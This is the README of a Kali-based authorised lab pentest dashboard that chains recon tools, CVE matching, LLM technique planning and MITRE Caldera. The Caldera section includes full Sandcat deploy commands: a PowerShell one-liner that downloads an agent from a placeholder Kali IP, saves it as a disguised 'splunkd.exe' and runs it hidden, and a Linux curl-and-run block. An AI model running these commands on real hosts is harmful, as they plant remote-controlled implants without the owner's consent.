# AutoPenTest

AutoPenTest is a Flask-based authorised lab assessment dashboard. It runs reconnaissance, normalises evidence, links official CVE List records where product/version evidence supports them, plans MITRE ATT&CK techniques with an optional local LLM, and can hand selected techniques to MITRE Caldera.

## What This Build Does

This build includes the v32.8 recon-module handoff fixes:

- Evidence collection and normalisation for Nmap, Gobuster, SMB, SSH, SNMP, LDAP, TLS, RDP, Hydra, and supporting tools.
- Official CVE List matching using the local CVEProject/cvelistV5 mirror.
- Service-centric Attack Surface Workbench with exposure evidence, CVE findings, candidate references, evidence gaps, and service-check evidence.
- HTML/PDF reports and JSON handoff output.
- Sanitised Hydra credential combos, safer command-output decoding, partial Gobuster result handling, improved SMB/Samba evidence merging, and clearer CVE wording.

Recon boundaries:

```text
footprinting
enumeration
evidence normalisation
official CVE List strict matching
service-level exposure checks
JSON/PDF handoff generation
```

The recon module does not score, rank, prioritise, exploit, or make execution decisions by itself.

## Quick Start On Kali

Place the project zip on the Kali desktop, then run:

```bash
cd /home/kali/Desktop
unzip AutoPenTest_Recon_Autonomous_Update_v32_8_from_v31.zip
cd AutoPenTest_Recon_Autonomous_Update_v32_8_from_v31
chmod +x install.sh
sudo ./install.sh
cd project
sudo .venv/bin/python app.py
```

Open:

```text
http://<kali-ip>:5000
```

If running locally on the same machine:

```text
http://127.0.0.1:5000
```

The Flask app now listens on `0.0.0.0` by default, so `http://<kali-ip>:5000`
works from your host browser or another VM. To force local-only mode:

```bash
APP_HOST=127.0.0.1 .venv/bin/python app.py
```

## Full Kali Runbook

Run these from separate terminal tabs because the Flask app, Ollama, and
CALDERA server are long-running processes.

Terminal 1, install and start AutoPenTest:

```bash
cd /home/kali/Desktop/AutoPenTest_Recon_Autonomous_Update_v32_8_from_v31
chmod +x install.sh
sudo ./install.sh
cd project
cp .env.example .env 2>/dev/null || true
nano .env
sudo .venv/bin/python app.py
```

Terminal 2, start Ollama and prepare the model:

```bash
ollama serve
```

Terminal 3, pull/check the model while Ollama is running:

```bash
ollama pull llama3.2:1b
ollama list
curl http://127.0.0.1:11434/api/tags
```

Terminal 4, start CALDERA:

```bash
cd /path/to/caldera
source .venv/bin/activate 2>/dev/null || true
python3 server.py --insecure --host 0.0.0.0
```

Recommended `project/.env` values for a Kali VM lab:

```bash
SECRET_KEY=change-me
DEBUG=false
APP_HOST=0.0.0.0
PORT=5000

CALDERA_URL=http://127.0.0.1:8888
CALDERA_API_KEY=redadmin
AGENT_GROUP=red
KALI_IP=CHANGE-THIS-TO-YOUR-KALI-IP
OPERATION_TIMEOUT=180

OLLAMA_URL=http://127.0.0.1:11434
OLLAMA_MODEL=llama3.2:1b
OLLAMA_TIMEOUT=180
```

To find the Kali IP to put in `KALI_IP`:

```bash
ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '^127\.'
```

## Manual Python Setup

```bash
cd project
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip setuptools wheel
python -m pip install -r requirements.txt
python app.py
```

## Environment

Create `project/.env` or export these variables:

```bash
SECRET_KEY=change-me
DEBUG=false

CALDERA_URL=http://127.0.0.1:8888
CALDERA_API_KEY=your-caldera-api-key
ENABLE_CALDERA_EXECUTION=0
AGENT_GROUP=red
KALI_IP=192.168.x.x
OPERATION_TIMEOUT=180

OLLAMA_URL=http://localhost:11434/api/generate
OLLAMA_MODEL=llama3.2:1b
OLLAMA_TIMEOUT=180

MYSQL_HOST=127.0.0.1
MYSQL_USER=autopentest
MYSQL_PASS=your-password
MYSQL_DB=autopentest

ENABLE_CONTEXT_FOOTPRINTING=0
ENABLE_ARP_SCAN=0
ENABLE_HTTPX=0
ENABLE_DEEP_WEB_DISCOVERY=0
ENABLE_SMBMAP=0
ENABLE_HYDRA=0
GOBUSTER_WORDLIST=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
HYDRA_CREDENTIAL_FILE=
MITRE_CVE_REPO=https://github.com/CVEProject/cvelistV5.git
```

MySQL is optional for the GUI to load, but database persistence requires a reachable MySQL server and the configured credentials.

`OLLAMA_URL` can be either `http://127.0.0.1:11434` or
`http://127.0.0.1:11434/api/generate`; the app adds `/api/generate`
automatically when only the base URL is configured.

## Scanning Tools

The Kali installer installs the main toolchain:

```bash
sudo apt-get install -y \
  arp-scan nmap bind9-dnsutils jq gobuster enum4linux-ng smbclient smbmap \
  snmp ldap-utils sslscan mtr-tiny traceroute hydra seclists git \
  python3 python3-venv python3-pip
```

Optional helpers are used when available:

```bash
sudo apt-get install -y ssh-audit httpx-toolkit rdpscan snmp-mibs-downloader
```

Check local tool availability:

```bash
cd project
source .venv/bin/activate
python3 scripts/check_tooling.py
```

## CVE Data

Sync or rebuild the official CVE List mirror:

```bash
cd project
source .venv/bin/activate
python scripts/sync_mitre_cve_database.py
python scripts/rebuild_mitre_cve_index.py
python scripts/mitre_cve_status.py
```

If CVE data looks stale or CVSS metadata is missing:

```bash
python scripts/audit_cve_source.py
```

The CVE review is strict by design. Confirmed CVE findings appear only when
the collected product/version/service evidence matches the official CVE List
records closely enough. If no confirmed CVEs are linked, use **Open CVE
Review** on the dashboard to see source/index status and any candidate CVE
references retained for analyst review.

## Ollama

Install and start Ollama, then pull the configured model:

```bash
ollama serve
ollama pull llama3.2:1b
```

The app uses Ollama for AI technique planning and the AI chat panel. If Ollama is unavailable, the app still runs and returns a safe unavailable message.

The AI Chatbox shows Ollama status in the sidebar. If it says the model is not
pulled, run:

```bash
ollama pull llama3.2:1b
```

## Caldera

Start MITRE Caldera separately and configure `CALDERA_URL` plus `CALDERA_API_KEY`. The dashboard checks agent readiness for the scanned target IP and shows a copyable deploy command when no trusted agent is matched.

Typical flow:

```bash
cd /path/to/caldera
python3 server.py --insecure
```

Editable Windows Sandcat deploy command. Paste it into an authorised Windows
lab target PowerShell session and edit only the IP in `$server` when your Kali
VM IP changes:

```powershell
$server="http://CHANGE-THIS-TO-YOUR-KALI-IP:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
```

Editable Linux Sandcat deploy block:

```bash
# Edit this IP if your Kali VM address changes; it must be reachable from the target.
CALDERA_SERVER='http://CHANGE-THIS-TO-YOUR-KALI-IP:8888';
# Download the official Sandcat payload from CALDERA.
curl -fsSL -H 'file:sandcat.go' -H 'platform:linux' "$CALDERA_SERVER/file/download" -o sandcat;
# Start a fresh agent in the red group.
chmod +x sandcat; ./sandcat -server "$CALDERA_SERVER" -group red
```

Then in AutoPenTest:

1. Run a scan.
2. Open the dashboard.
3. Use the Caldera panel to refresh agent status.
4. Copy the deploy command into the authorised lab target if needed.
5. Select techniques and run Caldera only when execution is explicitly enabled and authorised.

## Dashboard Flow

After a scan completes, the browser redirects to the results dashboard. Use:

- **Open CVE Review** to inspect confirmed CVEs, candidate references, and CVE index status.
- **Run Lab Validation** to run non-destructive reachability/default-content checks against allowlisted services.
- **Refresh Agent Status** to verify CALDERA/Sandcat readiness.
- **Generate Report** to open a dedicated report page.
- **Download Report** to export the generated text report.

Lab validation does not exploit the target. It performs safe checks such as TCP
reachability, HTTP default-content checks, and FTP anonymous-login validation
where applicable.

## Cleanup

Use the cleanup helper when you want to remove generated runtime files between
demo/test runs:

```bash
cd project
python3 utils/cleanup.py
```

Default cleanup removes transient logs, scan evidence files, generated report
files, and Python caches. It preserves saved result JSON, handoff packages, the
local CVE mirror/index, and `.env`.

Preview cleanup without deleting anything:

```bash
python3 utils/cleanup.py --dry-run
```

Clear saved scan result JSON only when you intentionally want a fresh dashboard
history:

```bash
python3 utils/cleanup.py --include-results
```

Keep command evidence files while still clearing logs/reports/caches:

```bash
python3 utils/cleanup.py --keep-scan-evidence
```

Clear the local CVE mirror/index only when you plan to resync/rebuild it:

```bash
python3 utils/cleanup.py --include-cve-data
python3 scripts/sync_mitre_cve_database.py
python3 scripts/rebuild_mitre_cve_index.py
```

## Testing

From repository root:

```bash
cd project
python3 -m pytest tests -q
python3 -m py_compile app.py config.py storage/*.py scanners/*.py scripts/*.py utils/cleanup.py
python3 scripts/audit_no_scoring.py
python3 scripts/audit_cve_source.py
```

## Project Layout

```text
project/
  app.py                 Flask routes and dashboard endpoints
  ai/                    Ollama client, AI planner, safety filters
  caldera/               Caldera API client and operation manager
  exploitation/          Lab-safe validation helpers
  mapping/               MITRE ATT&CK mapping helpers
  reports/               Text report generation
  scanners/              Recon pipeline, parsers, tooling, CVE matching
  scripts/               Tool checks and CVE index maintenance
  storage/               Runtime scan state and database helpers
  templates/             Dashboard HTML
  static/                CSS and browser JavaScript
  tests/                 Pytest coverage
```
